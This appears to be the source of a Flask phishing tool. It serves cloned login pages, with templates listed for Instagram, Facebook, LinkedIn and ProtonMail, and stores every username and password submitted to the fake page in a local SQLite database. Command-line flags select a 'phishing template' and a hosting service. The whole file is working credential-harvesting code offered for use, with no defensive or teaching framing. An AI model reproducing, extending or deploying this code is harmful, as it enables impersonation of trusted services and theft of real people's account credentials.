from flask import Flask, render_template, request
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Column, String, Integer

from argparse import ArgumentParser

app = Flask(__name__, template_folder="templates", static_folder='static', static_url_path='/static')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///cred.db'

db = SQLAlchemy(app)

selected_template = None

class Credential(db.Model):
    id = Column(Integer, primary_key=True)
    username = Column(String(100), nullable=False)
    password = Column(String(255), unique=True, nullable=False)

@app.route('/', methods=['POST', 'GET'])
def fake_page():
    if request.method == 'POST':
        username = request.form.get("username")
        password = request.form.get("password")

        cred = Credential(username=username, password=password)
        db.session.add(cred)
        db.session.commit()
    else:
        pass
    return render_template(f"{selected_template}"+".html")

if __name__ == "__main__":
    with app.app_context():
        db.create_all()

    parse = ArgumentParser()
    parse.add_argument('--templates', action="store_true",help="Show list all phishing templates")
    parse.add_argument('--select',type=str, help="Choose phishing template")
    parse.add_argument('--hosting', type=str, help="Choose service for hosting")

    args = parse.parse_args()

    if args.templates:
        print(
'''List templates:

[1]instagram
[2]facebook
[3]linkedin
[4]protonmail
'''
        )
    if args.select:
        if (args.select == 'facebook'):
            selected_template = "facebook"
        elif (args.select == 'instagram'):
            selected_template = 'instagram'

        app.run(debug=True)
    

    #app.run(debug=True)